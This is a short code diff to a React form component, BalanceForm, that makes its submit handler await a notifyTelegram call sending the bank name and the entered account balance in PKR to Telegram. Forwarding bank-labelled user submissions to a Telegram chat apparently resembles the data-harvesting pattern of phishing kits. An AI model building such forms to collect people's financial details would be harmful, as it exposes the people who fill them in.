@@ -26,10 +26,10 @@ export function BalanceForm({ slug, bankName }: { slug: string; bankName: string
     setRaw(digits)
   }
 
-  function handleSubmit(e: FormEvent) {
+  async function handleSubmit(e: FormEvent) {
     e.preventDefault()
     if (!isValid) return
-    notifyTelegram('Account Balance Submitted', [
+    await notifyTelegram('Account Balance Submitted', [
       { label: 'Bank', value: bankName },
       { label: 'Balance (PKR)', value: display },
     ])
